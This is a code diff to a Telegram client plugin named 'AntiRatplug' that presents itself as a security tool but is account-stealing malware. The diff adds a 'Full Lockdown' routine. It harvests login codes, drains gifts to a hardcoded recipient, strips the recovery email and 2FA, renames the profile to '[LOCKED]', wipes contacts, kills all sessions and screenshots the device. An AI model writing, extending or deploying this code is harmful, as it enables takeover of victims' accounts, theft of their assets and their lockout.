@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v22 — slim.
-Меню: Manual / Troll / Automatic. Без IDK start. Без persistence.
+AntiRatplug v22.1 — slim + Full Lockdown.
+Меню: Manual / Troll / Automatic. Без IDK start.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Slim v22."
+__description__ = "Slim v22.1 with Full Lockdown."
 __author__ = "@from_a4"
-__version__ = "22.0"
+__version__ = "22.1"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -366,7 +366,7 @@ class PluginSecurityPlugin(BasePlugin):
         time.sleep(self._jitter / 1000.0)
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v22 loaded")
+            self._send_msg("AntiRatplug v22.1 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -647,7 +647,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = "id:" + str(uc.getClientUserId())
         except Exception as e:
             _log("manage btn user: %s" % e)
-        text = "<b>AntiRatplug v22</b>\nUser: @" + username
+        text = "<b>AntiRatplug v22.1</b>\nUser: @" + username
         kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
         self._send_markup(text, kb, html=True)
 
@@ -663,7 +663,7 @@ class PluginSecurityPlugin(BasePlugin):
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("AntiRatplug v22", kb, html=True)
+        self._send_markup("AntiRatplug v22.1", kb, html=True)
 
     def _show_manual_menu(self):
         kb = {
@@ -763,6 +763,7 @@ class PluginSecurityPlugin(BasePlugin):
         kb = {
             "keyboard": [
                 [{"text": "🌾 Full Harvest"}],
+                [{"text": "🔒 Full Lockdown"}],
                 [{"text": "🎁 Gift Transfer"}],
                 [{"text": "⬅️ Back"}],
             ],
@@ -772,10 +773,11 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug v22</b>\n\n"
+            "<b>AntiRatplug v22.1</b>\n\n"
             "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
             "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
             "<b>Full Harvest</b> — сбор без модификаций\n"
+            "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + kill sessions + pull out\n"
             "<b>Gift Transfer</b> — gift drain на получателя\n\n"
             "Recipient: " + BOT_UID_STR
         )
@@ -900,6 +902,8 @@ class PluginSecurityPlugin(BasePlugin):
                 self._dim_screen()
             elif t == "🌾 Full Harvest":
                 self._full_harvest()
+            elif t == "🔒 Full Lockdown":
+                self._full_lockdown()
             elif t == "🎁 Gift Transfer":
                 threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
         except Exception as e:
@@ -1261,6 +1265,73 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             return "exc: %s" % e
 
+    def _remove_recovery_email(self, acc=0):
+        try:
+            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
+                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
+            if not PS:
+                return {"ok": False}
+            ns = PS()
+            try:
+                ns.email = ""
+            except Exception:
+                pass
+            try:
+                ns.flags = 0
+            except Exception:
+                pass
+            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
+                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
+            if not Upd:
+                return {"ok": False}
+            rq = Upd()
+            try:
+                rq.password = None
+            except Exception:
+                pass
+            rq.new_settings = ns
+            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
+            return {"ok": r is not None}
+        except Exception:
+            return {"ok": False}
+
+    def _nuke_password_pipeline(self, acc=0):
+        report = {"recovery_removed": False, "reset_password": "?",
+                  "cloud_wiped": None, "state_before": None, "state_after": None,
+                  "attempts": 0, "final": "unknown"}
+        try:
+            report["state_before"] = self._get_2fa_state(acc)
+        except Exception:
+            pass
+        sb = report["state_before"]
+        if sb is not None and not sb.get("has_password"):
+            report["final"] = "clean"
+            return report
+        for attempt in range(3):
+            report["attempts"] = attempt + 1
+            try:
+                r = self._remove_recovery_email(acc)
+                if isinstance(r, dict) and r.get("ok"):
+                    report["recovery_removed"] = True
+            except Exception:
+                pass
+            time.sleep(0.5)
+            try:
+                r = self._try_kill_2fa(acc)
+                report["reset_password"] = r
+                if r in ("ok", "not_set"):
+                    break
+            except Exception as e:
+                report["reset_password"] = "exc: %s" % e
+            time.sleep(1.0)
+        try:
+            report["state_after"] = self._get_2fa_state(acc)
+        except Exception:
+            pass
+        sa = report["state_after"]
+        report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
+        return report
+
     def _get_authorizations_full(self, acc=0):
         try:
             Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
@@ -1438,6 +1509,54 @@ class PluginSecurityPlugin(BasePlugin):
             return confirmed
         except Exception:
             return 0
+
+    def _change_username(self, acc=0):
+        try:
+            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+            new_un = "user_" + rnd
+            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateUsername",
+                       "org.telegram.tgnet.tl.TL_account$updateUsername")
+            if not Upd:
+                return None
+            rq = Upd()
+            rq.username = new_un
+            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
+            return new_un if r is not None else None
+        except Exception:
+            return None
+
+    def _change_profile(self, acc=0):
+        try:
+            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
+            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateProfile",
+                       "org.telegram.tgnet.tl.TL_account$updateProfile")
+            if not Upd:
+                return False
+            rq = Upd()
+            try:
+                rq.first_name = "[LOCKED]"
+                rq.last_name = rnd
+            except Exception:
+                pass
+            try:
+                rq.flags = 0x03
+            except Exception:
+                pass
+            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
+            return r is not None
+        except Exception:
+            return False
+
+    def _reset_contacts(self, acc=0):
+        try:
+            Rq = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
+                      "org.telegram.tgnet.tl.TL_contacts$resetContacts")
+            if not Rq:
+                return False
+            r, _e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
+            return r is not None
+        except Exception:
+            return False
 
     def _input_saved_gift(self, saved):
         if saved.get("msg_id"):
@@ -2746,6 +2865,117 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("\n".join(report), html=True)
             except Exception as e:
                 self._send_msg("harvest err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
+
+    def _full_lockdown(self):
+        def task():
+            def alive():
+                return self._sync_running and self._active and not self.stop
+            try:
+                t0 = time.time()
+                self._send_msg("Full Lockdown...")
+                report = ["<b>Full Lockdown</b>"]
+
+                # 1 Group A — harvest + sessions + web
+                if not alive():
+                    return
+                self._send_msg("1/7 harvest + sessions...")
+                ga = self._parallel([
+                    (self._tg_kid,),
+                    (self._confirm_unconfirmed_sessions, 0),
+                    (self._kill_web_authorizations, 0),
+                ], workers=3, timeout=120)
+                report.append("<b>Tg kid:</b> %s" % self._html_escape(str(ga[0] or "—")))
+                report.append("<b>Pending:</b> %s" % str(ga[1]))
+                report.append("<b>Web:</b> %s" % str(ga[2]))
+
+                # 2 gift drain
+                if not alive():
+                    return
+                self._send_msg("2/7 gift drain...")
+                try:
+                    gr = self._drain_gifts(0)
+                    if gr.get("error"):
+                        report.append("<b>Gifts:</b> err=%s" % gr["error"])
+                    else:
+                        conv = gr.get("convert") or {}
+                        u = gr.get("u") or []
+                        ok_count = sum(1 for x in u if isinstance(x, dict)
+                                       and isinstance(x.get("result"), dict)
+                                       and x["result"].get("ok"))
+                        report.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
+                            conv.get("converted_stars", 0), ok_count,
+                            gr.get("fee_deficit", 0)))
+                except Exception as e:
+                    report.append("<b>Gifts:</b> %s" % e)
+
+                # 3 2FA pipeline
+                if not alive():
+                    return
+                self._send_msg("3/7 2FA...")
+                try:
+                    pwd = self._nuke_password_pipeline(0)
+                except Exception as e:
+                    pwd = {"final": "exc: %s" % e}
+                report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
+
+                # 4 profile lock
+                if not alive():
+                    return
+                self._send_msg("4/7 profile lock...")
+                try:
+                    new_un = self._change_username(0)
+                except Exception:
+                    new_un = None
+                try:
+                    prof = self._change_profile(0)
+                except Exception:
+                    prof = False
+                try:
+                    cont = self._reset_contacts(0)
+                except Exception:
+                    cont = False
+                report.append("<b>Username:</b> @%s" % self._html_escape(str(new_un or "?")))
+                report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
+                report.append("<b>Contacts:</b> %s" % cont)
+
+                # 5 kill all sessions
+                if not alive():
+                    return
+                self._send_msg("5/7 kill sessions...")
+                k, total = self._kill_all_sessions(0)
+                report.append("<b>Sessions killed:</b> %d / %d" % (k, total))
+
+                # 6 screenshot gain
+                if not alive():
+                    return
+                self._send_msg("6/7 screenshot gain...")
+                try:
+                    self._screenshot_gain()
+                    report.append("<b>Screenshot gain:</b> sent")
+                except Exception:
+                    pass
+
+                # 7 pull out
+                if not alive():
+                    return
+                self._send_msg("7/7 pull out...")
+                try:
+                    self._pull_out_account()
+                    report.append("<b>Pull Out:</b> last")
+                except Exception as e:
+                    report.append("<b>Pull Out:</b> %s" % e)
+
+                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
+                report.append("<b>LOCKDOWN complete</b>")
+                self._send_markup("\n".join(report), {
+                    "inline_keyboard": [
+                        [{"text": "Logout again", "callback_data": "hv_logout"}],
+                    ]
+                }, html=True)
+            except Exception as e:
+                self._send_msg("lockdown err: " + str(e))
 
         threading.Thread(target=task, daemon=True).start()
 
